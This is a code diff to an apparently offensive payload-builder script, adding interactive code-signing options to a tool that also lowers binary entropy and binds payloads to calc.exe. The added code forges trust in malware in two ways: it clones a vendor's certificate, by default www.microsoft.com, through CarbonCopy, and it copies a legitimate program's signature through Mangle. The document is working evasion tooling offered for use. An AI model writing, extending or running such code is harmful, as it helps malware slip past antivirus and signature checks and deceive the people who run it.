@@ -9,12 +9,14 @@
 import argparse
 import subprocess
 import os
+import shutil
 import re
 import random
 import string
 import time
 import glob
 import sys
+import hashlib
 
 def check_non_negative(value):
     ivalue = int(value)
@@ -869,17 +871,21 @@ def strip_binary(binary_path):
     """
     try:
         subprocess.run(['strip', '--strip-all', binary_path], check=True)
-        print(f"\033[92m [+] Successfully stripped the binary: {binary_path} \033[0m")
+        print(f"\033[92m[+] Successfully stripped the binary: {binary_path} \033[0m")
     except subprocess.CalledProcessError as e:
         print(f"[-] Failed to strip the binary {binary_path}: {e}")
 
 
 def cleanup_files(*file_paths):
-    """Deletes specified files to clean up."""
+    """Deletes specified files or dirs to clean up."""
     for file_path in file_paths:
         try:
-            os.remove(file_path)
-            # print(f"Deleted temporary file: {file_path}")
+            if os.path.isfile(file_path):
+                os.remove(file_path)
+                # print(f"Deleted temporary file: {file_path}")
+            elif os.path.isdir(file_path):
+                shutil.rmtree(file_path)
+                # print(f"Deleted directory: {file_path}")
         except OSError as e:
             print(f"Error deleting temporary file {file_path}: {e}")
             print(f"File may not exists.")
@@ -1028,7 +1034,10 @@ def main():
 
     parser.add_argument('-entropy', type=int, choices=[1, 2], default=0, help='Entropy level for post-processing the output binary. 1 for null_byte.py, 2 for pokemon.py')
     parser.add_argument('-b', '--binder', nargs='?', const='binder/calc.exe', help='Optional: Path to a utility for binding. Defaults to binder/calc.exe if not provided.')
-    parser.add_argument('-s', '--sign-certificate', nargs='?', const='www.microsoft.com', help='Optional: Sign the payload using a cloned certificate from the specified website. Defaults to www.microsoft.com if no website is provided.')
+
+    parser.add_argument('-s', '--sign-certificate', nargs='?', const='ask_user', 
+                        help='Optional: Sign the payload. If a website or filepath is provided, use it. Defaults to interactive mode if no argument is provided.')
+
 
     args = parser.parse_args()
 
@@ -1140,7 +1149,7 @@ def main():
         # Run pokemon.py on the output binary
         subprocess.run(['python3', './entropy/pokemon.py', output_file_path], check=True)
     elif args.entropy == 0:
-        print("No entropy reduction applied.\n")
+        print("[-] No entropy reduction applied.\n")
 
     if args.binder:
         temp_output_file_path = output_file_path.replace('.exe', '_temp.exe')
@@ -1149,26 +1158,56 @@ def main():
         ## rename temp file back to original:
         os.rename(temp_output_file_path, output_file_path)
 
-    if args.sign_certificate:
-        website = args.sign_certificate  # Website provided by the user or default
-        signed_output_file_path = "signed_" + os.path.basename(output_file_path)
 
-        # Check if the signed binary already exists
-        if os.path.exists(signed_output_file_path):
-            overwrite = input(f"The file '{signed_output_file_path}' already exists. Do you want to overwrite it? (Y/N): ").strip().upper()
-            if overwrite == 'Y':
-                os.remove(signed_output_file_path)  # Remove the existing file to overwrite
-            elif overwrite == 'N':
-                print("Exiting the signing process as per user request.")
-                exit()  # Exit if the user does not want to overwrite the file
-            else:
-                print("Invalid input. Exiting the signing process.")
-                exit()  # Exit for any other input
-
-        # If the file does not exist or the user has chosen to overwrite it, proceed with signing
+    def sign_with_carbon_copy(website, output_file_path, signed_output_file_path):
         carbon_copy_command = f"python3 signature/CarbonCopy.py {website} 443 {output_file_path} {signed_output_file_path}"
         subprocess.run(carbon_copy_command, shell=True, check=True)
+        ## clean up files in certs folder in current directory, the cleanup files
+        cleanup_files('certs/')
+
+
+    def sign_with_mangle(file_path, output_file_path, signed_output_file_path):
+        mangle_command = f"./signature/Mangle -C {file_path} -I {output_file_path} -O {signed_output_file_path} -M"
+        subprocess.run(mangle_command, shell=True, check=True)
+
+    if args.sign_certificate:
+        signed_output_file_path = "signed_" + os.path.basename(output_file_path)
+
+        # Check for overwrite
+        if os.path.exists(signed_output_file_path):
+            overwrite = input(f"The file '{signed_output_file_path}' already exists. Do you want to overwrite it? (Y/N): ").strip().upper()
+            if overwrite == 'Y' or overwrite == '':
+                os.remove(signed_output_file_path)
+            elif overwrite == 'N':
+                print("Exiting the signing process as per user request.")
+                exit()
+            else:
+                print("Invalid input. Exiting the signing process.")
+                exit()
+
+        # Handle user interactions for certificate signing
+        if args.sign_certificate == 'ask_user':
+            response = input("Choose the signing method - Vendor (2) or Program (1): ").strip()
+            if response == '2':
+                vendor_name = input("Enter the vendor website or press enter for default (www.microsoft.com): ").strip()
+                vendor_name = vendor_name if vendor_name else 'www.microsoft.com'
+                sign_with_carbon_copy(vendor_name, output_file_path, signed_output_file_path)
+            elif response == '1':
+                program_path = input("Enter the program path or press enter for default (./signature/Desktops.exe): ").strip()
+                program_path = program_path if program_path else './signature/Desktops.exe'
+                sign_with_mangle(program_path, output_file_path, signed_output_file_path)
+            else:
+                print("Invalid option. Exiting.")
+                exit()
+        elif os.path.isfile(args.sign_certificate):
+            sign_with_mangle(args.sign_certificate, output_file_path, signed_output_file_path)
+        else:
+            sign_with_carbon_copy(args.sign_certificate, output_file_path, signed_output_file_path)
         print(f"\033[95m [+] Signed binary generated \033[0m: \033[92m{signed_output_file_path}\033[0m")
+            
+
+    ## calculate the final output file hash in red colour:
+    print(f"[+] Final output file hash: \033[91m{hashlib.md5(open(output_file_path, 'rb').read()).hexdigest()}\033[0m")
 
 
 if __name__ == '__main__':
